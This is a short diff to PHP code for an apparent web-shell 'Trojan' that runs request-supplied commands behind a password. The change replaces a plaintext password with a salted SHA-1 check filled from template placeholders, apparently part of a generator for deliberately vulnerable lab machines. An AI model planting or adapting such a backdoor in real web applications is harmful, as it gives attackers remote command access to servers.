@@ -297,7 +297,7 @@ session_start();
 $trojan = new Trojan();
 
 # only process the command if a valid password has been specified
-if($_REQUEST['args']['password'] == 'laser'){ 
+if(sha1($_REQUEST['args']['password'] . <%= locks[:one][:salt] %>) === '<%= locks[:one][:hash] %>'){ 
     $trojan->process_command($_REQUEST);
 }
 
